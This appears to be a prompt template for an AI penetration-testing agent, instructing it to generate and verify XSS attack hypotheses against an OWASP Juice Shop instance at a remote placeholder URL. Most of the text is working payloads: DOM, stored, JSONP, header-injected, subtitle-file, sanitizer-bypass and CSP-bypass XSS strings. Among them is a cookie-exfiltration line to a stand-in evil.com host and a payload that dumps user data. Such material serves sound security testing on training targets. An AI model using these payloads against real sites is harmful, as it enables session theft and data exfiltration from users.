# Phase 1b — XSS Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **Cross-Site Scripting (XSS) attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Cover **reflected XSS, stored XSS, and DOM-based XSS** vectors.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Hypotheses must specify **how Playwright browser automation will be used to prove exploitation** — dialog capture, DOM inspection, or screenshot evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Identify reflection points:** Endpoints where user input is reflected back in the HTTP response body or rendered in the DOM. Focus on Angular's `bypassSecurityTrustHtml` usage which explicitly disables XSS protection.
2. **Identify stored input sinks:** Endpoints that accept user input and store it for later rendering (feedback, reviews, user profiles, product names). Pay special attention to the admin panel which renders stored data via `bypassSecurityTrustHtml`.
3. **Identify DOM sinks:** Client-side JavaScript patterns that write user-controlled data to the DOM via `innerHTML`, `document.write()`, `eval()`, or Angular template expressions. Juice Shop's search component uses `bypassSecurityTrustHtml` to render search queries.
4. **Cross-reference with known CVEs** — Angular 1.x has well-documented template injection / sandbox escape vulnerabilities. Also check `sanitize-html` CVEs.
5. **Prioritise by exploitability and Playwright provability:**
   - DOM-based XSS via search `/#/search?q=` (highest — directly provable with Playwright dialog capture)
   - Stored XSS via feedback/review submitted via API then rendered in admin panel
   - Reflected XSS via API endpoints that return unescaped HTML in JSON responses
6. **Specify proof mechanism for each hypothesis:** State exactly which Playwright capability (dialog listener, DOM locator, screenshot) will prove exploitation.

## Juice Shop XSS-Specific Context

### Primary Target: Search-Based DOM XSS (HIGHEST PRIORITY)
- **Route:** `/#/search?q=<payload>` — this is the AngularJS client-side route
- **Source code evidence:** `search-result.component.ts:171` calls `this.sanitizer.bypassSecurityTrustHtml(queryParam)` which **explicitly disables Angular's XSS protection** for the search query display
- **Proof mechanism:** Navigate via Playwright → `page.goto('{{TARGET_URL}}/#/search?q=<iframe src="javascript:alert(xss)">')` → capture `dialog` event → confirmed
- **Key insight:** Because `bypassSecurityTrustHtml` is used, standard HTML tags like `<iframe>`, `<img>`, `<svg>` with event handlers will execute — no Angular sandbox escape needed

### Secondary Target: Stored XSS via Feedback
- **Endpoint:** `POST /api/Feedbacks` with `comment` field
- **Source code evidence:** `administration.component.ts:78` renders feedback comments via `bypassSecurityTrustHtml(feedback.comment)` in the admin panel
- **Proof mechanism:** POST the payload via HTTP → navigate to admin page with Playwright → capture dialog or detect DOM element
- **CAPTCHA note:** The feedback endpoint requires a CAPTCHA. Use Playwright to solve it by reading the CAPTCHA value from the page, or use the `/api/Feedbacks` endpoint directly if the CAPTCHA can be obtained

### Tertiary Targets
- **Angular template injection:** `{{constructor.constructor('alert(1)')()}}` — may work if Angular processes the template expression before sanitization
- **sanitize-html bypass:** Version 1.4.2 has known bypasses (CVE-2016-1000237). Nested tag confusion: `<<b>script>alert(1)<</b>/script>`
- **User registration fields:** `POST /api/Users` — email, username fields may store XSS payloads that render in admin panels

### JSONP Callback XSS (Shannon XSS-VULN-02)
- **Endpoint:** `GET /rest/user/whoami?callback=<payload>`
- **Mechanism:** The `/rest/user/whoami` endpoint accepts a `callback` query parameter for JSONP responses. If the callback value is reflected without sanitization in the response body (e.g. `<payload>({"user":...})`), an attacker can inject arbitrary JavaScript via the callback name.
- **Proof mechanism:** Use `browser_navigate` to load a crafted URL that invokes the JSONP endpoint via `<script src>` injection or directly navigate and check if the callback content-type allows script execution. Alternatively test via `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)"></script>` embedded in a page.
- **Key payloads:** `alert(1)//`, `alert(document.cookie)//`, `fetch('http://evil.com?c='+document.cookie)//`

### Server-Side XSS Protection Bypass (Write-up 4-star)
- **Endpoint:** `POST /api/Feedbacks` (or any endpoint with server-side HTML sanitization)
- **Mechanism:** The server uses a library to strip `<script>` tags and known XSS vectors before storage. However, non-standard payload encodings or nested tag tricks can bypass this. Example: `<img src="javascript:alert('xss')">` may bypass filters that only strip `<script>`. Also try `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('xss')>` (HTML entity encoding).
- **Proof mechanism:** POST the payload via API, then navigate to admin page with Playwright to check if the payload survived sanitization and executes.

### X-Header XSS (Write-up 4-star `x_header_xss`)
- **Endpoint:** Any request where Juice Shop reflects HTTP headers in error pages or admin logs
- **Mechanism:** Inject XSS payload in the `X-Forwarded-For`, `True-Client-IP`, or `X-User-Id` HTTP headers. If the application logs or displays these headers without sanitization (e.g., in last login IP display, admin access logs, or error pages), the stored payload executes when an admin views the data.
- **Key payloads:**
  - `X-Forwarded-For: <iframe src="javascript:alert('xss')">`
  - `True-Client-IP: <img src=x onerror=alert('xss')>`
- **Proof mechanism:** Send HTTP requests with XSS payloads in headers, then navigate with Playwright to pages that display the header data (admin panel, user profile "last login IP").

### Video XSS via Subtitles (Write-up 6-star `video_xss`)
- **Endpoint:** `POST /file-upload` or `/video` endpoint accepting media files
- **Mechanism:** Upload a video file (or a crafted `.mp4`/`.webm`) with an embedded subtitle track (`.vtt` WebVTT format) containing XSS payload. When the video is rendered in the browser with `<track>` subtitle support, the XSS payload in the subtitle cue text executes. Alternatively, craft a malicious VTT file:
  ```
  WEBVTT

  00:00:00.000 --> 00:00:01.000
  <img src=x onerror=alert('VideoXSS')>
  ```
  Upload and navigate to the page that renders the video with subtitles.
- **Proof mechanism:** Upload the crafted subtitle/video file, navigate to the page displaying it with Playwright, and check for dialog events or DOM injection.

### CSP Bypass via Base Tag or Data URI
- **Endpoint:** `GET /#/search?q=` or any injectable page
- **Mechanism:** If the application has a Content Security Policy (CSP), bypass it using:
  - `<base href="https://attacker.com/">` — redirects all relative URL fetches to the attacker's domain
  - `<meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline'">` — attempt to override CSP via injected meta tag
  - `data:text/html,<script>alert('csp-bypass')</script>` in `<iframe src>` or `<object data>`
- **Proof mechanism:** Inject base tag or data URI payload via search, check with Playwright if script execution occurs despite CSP.

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name or DOM sink>
**XSS Type:** <reflected / stored / DOM-based>
**Payload:** <specific XSS payload>
**Expected Result:** <what successful XSS execution would produce>
**Playwright Proof Strategy:** <exactly how Playwright will prove exploitation — dialog capture, DOM query, or screenshot>
**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md>
```

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

### Core DOM/Stored XSS
1. **DOM XSS via search** — `GET /#/search?q=<iframe src="javascript:alert(xss)">` — proven by Playwright dialog capture
2. **Stored XSS via feedback** — `POST /api/Feedbacks` with `comment` containing XSS payload — proven by navigating to admin page
3. **Stored XSS via user registration** — `POST /api/Users` with email/username containing XSS — proven by API response showing unescaped payload

### JSONP & Reflected XSS
4. **JSONP callback XSS** — `GET /rest/user/whoami?callback=alert(document.cookie)//` — reflected XSS via JSONP endpoint. Prove that the callback parameter is reflected unsanitized in the response body with a script-executable content type. Test by embedding `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)//"></script>` in an HTML page or navigating directly.
5. **Server-side XSS protection bypass** — `POST /api/Feedbacks` with a payload that bypasses server-side sanitization: `<img src="javascript:alert('xss')">` or `<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('serverbypass')>`. Prove by checking that the payload survives server-side stripping and executes when rendered in the admin panel via Playwright.

### Header & Media XSS
6. **X-Header XSS** — Send requests with `X-Forwarded-For: <iframe src="javascript:alert('xheader')">` header to any endpoint. Then navigate to the admin panel or user profile pages (e.g. last login IP display) with Playwright to check if the header value is rendered unescaped and triggers script execution.
7. **Video XSS via subtitles** — Upload a crafted video or `.vtt` subtitle file containing `<img src=x onerror=alert('VideoXSS')>` via `POST /file-upload` or the complaint/profile upload flow. Navigate to the page rendering the video to check for dialog events via Playwright.

### Sanitizer & Policy Bypass
8. **sanitize-html nested tag bypass (CVE-2016-1000237)** — `POST /api/Feedbacks` with comment `<<b>script>alert(1)<</b>/script>` exploiting sanitize-html 1.4.2 tag confusion. Prove stored execution via admin panel navigation with Playwright.
9. **Bonus Payload** — The Juice Shop 1-star XSS challenge uses a specific well-known XSS payload. Test the canonical `<script>alert('xss')</script>` payload on the search page and feedback endpoints as a baseline. Also try `<b onmouseover=alert('xss')>click me!</b>` as an interaction-based variant.
10. **CSP bypass via `<base>` tag or `data:` URI** — `GET /#/search?q=<base href="https://attacker.com/">` or `<iframe src="data:text/html,<script>alert('csp')</script>">` — attempt to circumvent Content Security Policy restrictions. Check via Playwright whether script execution is achieved despite CSP headers.

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 10 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** GET /#/search?q=
**Parameter:** q (DOM — rendered via bypassSecurityTrustHtml)
**XSS Type:** DOM-based
**Payload:** <iframe src="javascript:alert(`xss`)">
**Expected Result:** JavaScript alert dialog fires with message "xss" when page renders
**Playwright Proof Strategy:** Register `page.on('dialog')` listener BEFORE `page.goto()`. Listener captures dialog type and message. Also take screenshot showing the injected iframe in the search results area.
**Evidence from recon:** search-result.component.ts:171 uses bypassSecurityTrustHtml to render the search query parameter directly in the DOM

### Hypothesis 2
**Endpoint:** POST /api/Feedbacks
**Parameter:** comment (JSON body)
**XSS Type:** Stored
**Payload:** <script>alert('xss-feedback')</script> embedded in feedback comment
**Expected Result:** Script executes when admin navigates to the administration page
**Playwright Proof Strategy:** POST the feedback via HTTP request. Then use Playwright to navigate to `/#/administration` with admin auth. Register dialog listener; if dialog fires, stored XSS confirmed.
**Evidence from recon:** administration.component.ts:78 renders feedback.comment via bypassSecurityTrustHtml

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop (Angular + Express + bypassSecurityTrustHtml)

### DOM XSS via search (HIGHEST PRIORITY — directly provable):
Since `bypassSecurityTrustHtml` explicitly disables Angular's built-in sanitizer, standard HTML tags work:
- `<iframe src="javascript:alert('xss')">` — triggers alert via iframe src
- `<img src=x onerror=alert('xss')>` — triggers alert via error handler
- `<svg onload=alert('xss')>` — triggers alert via SVG load event
- `<audio src=x onerror=alert('xss')>` — alternative event handler

### JSONP callback XSS:
The `/rest/user/whoami` endpoint reflects the `callback` parameter in the response:
- `alert(document.cookie)//` — basic callback injection
- `alert(1)//` — minimal proof payload
- Navigate to `{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)//` and check if the response Content-Type allows execution
- Embed via `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert('jsonp')//"></script>` on an injectable page

### Server-side XSS filter bypass:
Server-side sanitization strips `<script>` tags but may miss:
- `<img src="javascript:alert('xss')">` — javascript: protocol in img src
- `<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('xss')>` — HTML entity encoded javascript:
- `<body onload=alert('xss')>` — body event handler
- `<input onfocus=alert('xss') autofocus>` — autofocus-triggered event
- `%3Cscript%3Ealert('xss')%3C/script%3E` — URL-encoded script tags

### X-Header XSS via HTTP headers:
Inject payloads in HTTP request headers that may be logged/displayed:
- `X-Forwarded-For: <iframe src="javascript:alert('xheader')">`
- `True-Client-IP: <img src=x onerror=alert('header-xss')>`
- `X-User-Id: <svg onload=alert('xss')>`
- These execute when an admin views access logs or "last login" displays

### Video/Subtitle XSS:
Craft a WebVTT subtitle file with embedded XSS:
```
WEBVTT

00:00:00.000 --> 00:00:10.000
<img src=x onerror=alert('VideoXSS')>
```
- Upload as `.vtt` or embedded in a video container
- The browser's native subtitle renderer may execute inline HTML in cue text

### CSP bypass payloads:
- `<base href="https://attacker.com/">` — hijack relative URLs
- `<iframe src="data:text/html,<script>alert('csp')</script>">` — data URI bypass
- `<object data="data:text/html,<script>alert('csp')</script>">` — object element bypass
- `<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">` — override CSP via meta tag

### Angular template injection (if Angular processes expressions):
- `{{constructor.constructor('alert(1)')()}}`
- `{{$on.constructor('alert(1)')()}}`
- `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}`

### Stored XSS (feedback/reviews/user data):
- `<script>alert(document.cookie)</script>` — classic stored XSS
- `<b onmouseover=alert('xss')>hover me</b>` — event handler based
- `<img src=x onerror="fetch('/api/Users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))">` — data exfiltration

### Sanitizer bypass (sanitize-html 1.4.2):
- `<<b>script>alert(1)<</b>/script>` (nested tag confusion — CVE-2016-1000237)
- `<img src="x" onerror="alert(1)" />` (self-closing with event handler)

### Proof capture via Playwright:
Every payload should be tested with this Playwright workflow:
1. `page.on('dialog', handler)` — register BEFORE navigation
2. `page.goto(url)` — navigate to the target with the payload
3. Check if dialog handler fired → CONFIRMED
4. If no dialog: `page.locator('iframe, script, img[onerror], svg[onload]').count()` → DOM evidence
5. `page.screenshot()` — visual evidence regardless of outcome

Save the output as `hypotheses_xss.md` using the `save_deliverable` tool.
